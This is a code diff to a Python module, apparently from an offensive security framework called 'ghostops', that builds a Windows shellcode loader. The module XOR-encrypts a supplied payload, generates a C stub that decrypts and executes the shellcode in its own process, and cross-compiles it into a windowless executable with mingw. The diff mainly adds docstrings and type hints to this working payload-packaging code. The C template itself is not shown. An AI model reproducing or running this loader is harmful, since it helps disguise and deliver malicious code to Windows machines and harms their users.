@@ -7,6 +7,11 @@ from ghostops.core.utils import Logger
 
 
 class WindowsXorLoader(BaseModule):
+    """
+    Module that injects XOR-encrypted shellcode into its own process
+    using a generated C stub which decrypts and executes the shellcode at runtime.
+    """
+
     module_name = "WindowsXorLoader"
     module_description = (
         "Injects XOR-encrypted shellcode into its own process using a generated C stub."
@@ -17,7 +22,13 @@ class WindowsXorLoader(BaseModule):
     module_target_architecture = ["x86", "x64"]
 
     @staticmethod
-    def add_arguments(parser):
+    def add_arguments(parser) -> None:
+        """
+        Define module-specific command line arguments.
+
+        Args:
+            parser (argparse.ArgumentParser): Argument parser instance.
+        """
         parser.add_argument(
             "--payload",
             required=True,
@@ -41,20 +52,58 @@ class WindowsXorLoader(BaseModule):
         )
 
     @staticmethod
-    def generate_random_key(length=15) -> bytes:
+    def generate_random_key(length: int = 15) -> bytes:
+        """
+        Generate a random XOR key string of specified length.
+
+        Args:
+            length (int): Length of the XOR key.
+
+        Returns:
+            bytes: Randomly generated XOR key as bytes.
+        """
         charset = string.ascii_letters + string.digits + string.punctuation
         return "".join(random.choice(charset) for _ in range(length)).encode()
 
     @staticmethod
     def xor_encrypt(data: bytes, key: bytes) -> bytes:
+        """
+        XOR encrypt the input data with the given key.
+
+        Args:
+            data (bytes): Data to encrypt.
+            key (bytes): XOR key.
+
+        Returns:
+            bytes: XOR encrypted data.
+        """
         return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
     @staticmethod
     def format_bytes_for_c(data: bytes) -> str:
+        """
+        Format bytes as comma-separated hex values for C array initialization.
+
+        Args:
+            data (bytes): Byte data to format.
+
+        Returns:
+            str: Formatted string for C source.
+        """
         return ",".join(f"0x{b:02x}" for b in data)
 
     @staticmethod
     def generate_c_source(encrypted_shellcode: bytes, xor_key: bytes) -> str:
+        """
+        Generate C source code that decrypts and executes the XOR-encrypted shellcode.
+
+        Args:
+            encrypted_shellcode (bytes): XOR encrypted shellcode bytes.
+            xor_key (bytes): XOR key bytes.
+
+        Returns:
+            str: C source code as a string.
+        """
         shellcode_c_array = WindowsXorLoader.format_bytes_for_c(encrypted_shellcode)
         key_c_array = WindowsXorLoader.format_bytes_for_c(xor_key)
 
@@ -89,7 +138,15 @@ int main() {{
 """
 
     @staticmethod
-    def compile_c_code(source_file: Path, output_exe: Path, arch: str):
+    def compile_c_code(source_file: Path, output_exe: Path, arch: str) -> None:
+        """
+        Compile the generated C source file to a Windows executable.
+
+        Args:
+            source_file (Path): Path to the C source file.
+            output_exe (Path): Path for the output executable.
+            arch (str): Target architecture, either 'x86' or 'x64'.
+        """
         compiler = "x86_64-w64-mingw32-gcc" if arch == "x64" else "i686-w64-mingw32-gcc"
         flags = ["-mwindows"] if arch == "x64" else ["-m32", "-mwindows"]
 
@@ -97,16 +154,31 @@ int main() {{
             subprocess.run(
                 [compiler, str(source_file), "-o", str(output_exe)] + flags, check=True
             )
-            Logger.log("good", f"Executable compiled: {output_exe}")
+            Logger.log("good", f"Executable compiled successfully: {output_exe}")
         except subprocess.CalledProcessError as e:
             Logger.log("flaw", f"GCC compilation failed: {e}")
 
     @staticmethod
-    def main(args):
+    def main(args) -> None:
+        """
+        Main execution logic of the module.
+
+        Steps:
+        - Validates payload file
+        - Reads shellcode bytes
+        - Generates or uses provided XOR key
+        - XOR encrypts shellcode
+        - Generates C source code with embedded encrypted shellcode and key
+        - Writes C source to disk
+        - Compiles C source into Windows executable
+
+        Args:
+            args: Parsed command-line arguments.
+        """
         payload_path = Path(args.payload)
         output_path = Path(args.output)
 
-        if not payload_path.exists() or payload_path.suffix != ".bin":
+        if not payload_path.exists() or payload_path.suffix.lower() != ".bin":
             Logger.log("flaw", "Payload must be a valid .bin file")
             return
 
